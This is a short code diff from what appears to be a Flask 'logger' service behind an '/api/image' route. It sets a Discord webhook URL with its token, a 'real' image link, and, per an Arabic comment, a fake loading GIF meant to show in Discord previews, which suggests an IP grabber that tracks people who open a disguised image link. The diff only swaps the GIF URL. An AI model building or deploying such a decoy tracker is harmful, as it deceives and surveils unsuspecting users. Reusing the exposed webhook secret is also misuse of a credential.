@@ -8,7 +8,7 @@ app = Flask(__name__)
 WEBHOOK_URL = "https://discord.com/api/webhooks/1493558963869061224/tY_NAc83SlbAMed-ibT8MdFhC88Owdqb-naTrn6q5-En386EXCCqZBByyhiPg6S7JBOr"
 REAL_IMAGE = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRvw7uLGr6ScxbGYJhGNqEjXnW-e6nJaE5c0w&s"
 # رابط صورة التحميل الوهمية التي ستظهر في ديسكورد
-LOADING_GIF = "https://tenor.com/view/loading-discord-loading-discord-boxes-squares-gif-16187521" 
+LOADING_GIF = "https://media1.tenor.com/m/BP79uBTrSy0AAAAd/loading-discord.gif" 
 
 @app.route('/api/image')
 def logger():
